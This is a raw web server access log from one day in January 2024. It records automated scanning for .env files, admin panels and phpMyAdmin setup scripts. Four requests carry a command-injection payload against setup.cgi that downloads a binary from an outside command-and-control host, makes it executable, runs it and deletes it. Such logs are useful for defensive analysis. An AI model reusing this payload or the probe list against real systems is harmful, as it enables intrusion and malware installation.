185.254.196.173 - - [06/Jan/2024:12:09:30 +0000] "GET /.env HTTP/1.1" 404 755
185.254.196.173 - - [06/Jan/2024:12:09:31 +0000] "POST / HTTP/1.1" 200 3979
135.125.244.48 - - [06/Jan/2024:12:10:02 +0000] "GET /.env HTTP/1.1" 404 755
135.125.244.48 - - [06/Jan/2024:12:10:03 +0000] "POST / HTTP/1.1" 200 3979
193.35.18.223 - - [06/Jan/2024:12:18:04 +0000] "GET /setup.cgi?next_file=afr.cfg&todo=syscmd&cmd=wget%20http://HIVE-c2.swarmnetwork.online/bash%20-O%20/var/tmp/bash;%20chmod%20777%20/var/tmp/bash;%20/var/tmp/bash;%20rm%20-rf%20/var/tmp/bash&curpath=/&currentsetting.htm=1 HTTP/1.1" 404 760
193.35.18.223 - - [06/Jan/2024:12:18:05 +0000] "GET /setup.cgi?next_file=afr.cfg&todo=syscmd&cmd=wget%20http://HIVE-c2.swarmnetwork.online/bash%20-O%20/var/tmp/bash;%20chmod%20777%20/var/tmp/bash;%20/var/tmp/bash;%20rm%20-rf%20/var/tmp/bash&curpath=/&currentsetting.htm=1 HTTP/1.1" 404 760
193.35.18.223 - - [06/Jan/2024:12:22:55 +0000] "GET /setup.cgi?next_file=afr.cfg&todo=syscmd&cmd=wget%20http://HIVE-c2.swarmnetwork.online/bash%20-O%20/var/tmp/bash;%20chmod%20777%20/var/tmp/bash;%20/var/tmp/bash;%20rm%20-rf%20/var/tmp/bash&curpath=/&currentsetting.htm=1 HTTP/1.1" 404 760
193.35.18.223 - - [06/Jan/2024:12:22:56 +0000] "GET /setup.cgi?next_file=afr.cfg&todo=syscmd&cmd=wget%20http://HIVE-c2.swarmnetwork.online/bash%20-O%20/var/tmp/bash;%20chmod%20777%20/var/tmp/bash;%20/var/tmp/bash;%20rm%20-rf%20/var/tmp/bash&curpath=/&currentsetting.htm=1 HTTP/1.1" 404 760
207.127.96.148 - - [06/Jan/2024:12:29:24 +0000] "GET /.env HTTP/1.1" 404 755
139.162.84.205 - - [06/Jan/2024:12:43:19 +0000] "GET / HTTP/1.0" 200 3979
192.241.237.45 - - [06/Jan/2024:12:45:13 +0000] "GET / HTTP/1.1" 200 3979
101.32.192.203 - - [06/Jan/2024:12:50:40 +0000] "HEAD /Core/Skin/Login.aspx HTTP/1.1" 404 -
104.131.144.29 - - [06/Jan/2024:13:03:08 +0000] "GET /hudson HTTP/1.1" 404 757
135.125.246.110 - - [06/Jan/2024:13:18:38 +0000] "GET /.env HTTP/1.1" 404 755
135.125.246.110 - - [06/Jan/2024:13:18:39 +0000] "POST / HTTP/1.1" 200 3979
185.254.196.173 - - [06/Jan/2024:13:38:05 +0000] "GET /.env HTTP/1.1" 404 755
185.254.196.173 - - [06/Jan/2024:13:38:05 +0000] "POST / HTTP/1.1" 200 3979
64.62.197.22 - - [06/Jan/2024:13:38:34 +0000] "-" 400 2851
107.170.192.30 - - [06/Jan/2024:13:39:03 +0000] "GET /portal/redlion HTTP/1.1" 404 769
62.204.41.80 - - [06/Jan/2024:13:43:05 +0000] "-" 400 2019
205.185.119.170 - - [06/Jan/2024:13:55:04 +0000] "GET /manager/html HTTP/1.1" 403 3446
34.140.248.32 - - [06/Jan/2024:14:19:51 +0000] "GET / HTTP/1.1" 200 3979
101.32.192.203 - - [06/Jan/2024:14:28:08 +0000] "HEAD /Core/Skin/Login.aspx HTTP/1.1" 404 -
138.199.60.32 - - [06/Jan/2024:14:29:52 +0000] "GET / HTTP/1.1" 200 3979
135.125.246.110 - - [06/Jan/2024:15:30:54 +0000] "GET /.env HTTP/1.1" 404 755
135.125.246.110 - - [06/Jan/2024:15:30:54 +0000] "POST / HTTP/1.1" 200 3979
45.79.181.179 - - [06/Jan/2024:15:53:02 +0000] "-" 400 2207
101.32.192.203 - - [06/Jan/2024:16:05:26 +0000] "HEAD /Core/Skin/Login.aspx HTTP/1.1" 404 -
79.137.67.195 - - [06/Jan/2024:16:06:19 +0000] "GET / HTTP/1.1" 200 3979
205.185.119.170 - - [06/Jan/2024:16:10:13 +0000] "GET /manager/html HTTP/1.1" 403 3446
185.254.196.173 - - [06/Jan/2024:16:32:13 +0000] "GET /.env HTTP/1.1" 404 755
118.193.38.134 - - [06/Jan/2024:16:34:39 +0000] "GET / HTTP/1.1" 200 3979
118.193.38.134 - - [06/Jan/2024:16:34:39 +0000] "GET /favicon.ico HTTP/1.1" 404 762
118.193.38.134 - - [06/Jan/2024:16:34:40 +0000] "GET /img/logo.png HTTP/1.1" 200 5124
118.193.38.134 - - [06/Jan/2024:16:34:40 +0000] "GET /js/swipebox.js HTTP/1.1" 200 1050
118.193.38.134 - - [06/Jan/2024:16:34:40 +0000] "GET /robots.txt HTTP/1.1" 404 761
118.193.38.134 - - [06/Jan/2024:16:34:40 +0000] "GET /sitemap.xml HTTP/1.1" 404 762
118.193.38.134 - - [06/Jan/2024:16:34:41 +0000] "GET null HTTP/1.1" 400 2039
118.193.38.134 - - [06/Jan/2024:16:34:41 +0000] "GET /struts/webconsole.html HTTP/1.1" 404 777
118.193.38.134 - - [06/Jan/2024:16:34:41 +0000] "GET /?actionErrors=1111 HTTP/1.1" 200 3979
118.193.38.134 - - [06/Jan/2024:16:34:42 +0000] "GET /invoker/readonly HTTP/1.1" 404 771
139.162.84.205 - - [06/Jan/2024:16:40:57 +0000] "GET / HTTP/1.0" 200 3979
14.103.41.33 - - [06/Jan/2024:16:46:16 +0000] "GET /phpMyAdmin/scripts/setup.php HTTP/1.0" 404 787
14.103.41.33 - - [06/Jan/2024:16:46:17 +0000] "GET /phpmyadmin/scripts/setup.php HTTP/1.0" 404 787
14.103.41.33 - - [06/Jan/2024:16:46:17 +0000] "GET /phpMyAdmin-2.11.4/scripts/setup.php HTTP/1.0" 404 794
14.103.41.33 - - [06/Jan/2024:16:46:18 +0000] "GET /phpMyAdmin-2.11.3/scripts/setup.php HTTP/1.0" 404 794
14.103.41.33 - - [06/Jan/2024:16:46:18 +0000] "GET /phpMyAdmin-2.10.0.2/scripts/setup.php HTTP/1.0" 404 796
14.103.41.33 - - [06/Jan/2024:16:46:19 +0000] "GET /phpMyAdmin/scripts/setup.php HTTP/1.0" 404 787
14.103.41.33 - - [06/Jan/2024:16:46:19 +0000] "GET /phpMyAdmin-2.10.3/scripts/setup.php HTTP/1.0" 404 794
14.103.41.33 - - [06/Jan/2024:16:46:19 +0000] "GET /phpmyadmin/scripts/setup.php HTTP/1.0" 404 787
14.103.41.33 - - [06/Jan/2024:16:46:19 +0000] "GET /phpMyAdmin-2.8.0.2/scripts/setup.php HTTP/1.0" 404 795
14.103.41.33 - - [06/Jan/2024:16:46:19 +0000] "GET /phpMyAdmin-2.11.4/scripts/setup.php HTTP/1.0" 404 794
14.103.41.33 - - [06/Jan/2024:16:46:20 +0000] "GET /phpMyAdmin-2.10.2/scripts/setup.php HTTP/1.0" 404 794
14.103.41.33 - - [06/Jan/2024:16:46:20 +0000] "GET /phpMyAdmin-2.11.3/scripts/setup.php HTTP/1.0" 404 794
14.103.41.33 - - [06/Jan/2024:16:46:21 +0000] "GET /phpMyAdmin-2.11.9.2/scripts/setup.php HTTP/1.0" 404 796
14.103.41.33 - - [06/Jan/2024:16:46:21 +0000] "GET /phpMyAdmin-2.11.0/scripts/setup.php HTTP/1.0" 404 794
14.103.41.33 - - [06/Jan/2024:16:46:21 +0000] "GET /phpMyAdmin-2.10.0.2/scripts/setup.php HTTP/1.0" 404 796
14.103.41.33 - - [06/Jan/2024:16:46:22 +0000] "GET /phpMyAdmin-2.11.7/scripts/setup.php HTTP/1.0" 404 794
14.103.41.33 - - [06/Jan/2024:16:46:22 +0000] "GET /phpMyAdmin-2.10.3/scripts/setup.php HTTP/1.0" 404 794
14.103.41.33 - - [06/Jan/2024:16:46:23 +0000] "GET /phpMyAdmin-2.11.1.2/scripts/setup.php HTTP/1.0" 404 796
14.103.41.33 - - [06/Jan/2024:16:46:24 +0000] "GET /pma/scripts/setup.php HTTP/1.0" 404 780
14.103.41.33 - - [06/Jan/2024:16:46:25 +0000] "GET /phpMyAdmin3/scripts/setup.php HTTP/1.0" 404 788
14.103.41.33 - - [06/Jan/2024:16:46:25 +0000] "GET /myadmin/scripts/setup.php HTTP/1.0" 404 784
14.103.41.33 - - [06/Jan/2024:16:46:25 +0000] "GET /phpMyAdmin-2.8.0.2/scripts/setup.php HTTP/1.0" 404 795
14.103.41.33 - - [06/Jan/2024:16:46:25 +0000] "GET /MyAdmin/scripts/setup.php HTTP/1.0" 404 784
14.103.41.33 - - [06/Jan/2024:16:46:26 +0000] "GET /phpMyAdmin-2.10.2/scripts/setup.php HTTP/1.0" 404 794
14.103.41.33 - - [06/Jan/2024:16:46:26 +0000] "GET /PHPMYADMIN/scripts/setup.php HTTP/1.0" 404 787
14.103.41.33 - - [06/Jan/2024:16:46:26 +0000] "GET /phpMyAdmin-2.11.9.2/scripts/setup.php HTTP/1.0" 404 796
14.103.41.33 - - [06/Jan/2024:16:46:26 +0000] "GET /mysqladmin/scripts/setup.php HTTP/1.0" 404 787
14.103.41.33 - - [06/Jan/2024:16:46:28 +0000] "GET /phpMyAdmin-2.11.0/scripts/setup.php HTTP/1.0" 404 794
14.103.41.33 - - [06/Jan/2024:16:46:28 +0000] "GET /SQL/scripts/setup.php HTTP/1.0" 404 780
14.103.41.33 - - [06/Jan/2024:16:46:28 +0000] "GET /phpMyAdmin-2.11.7/scripts/setup.php HTTP/1.0" 404 794
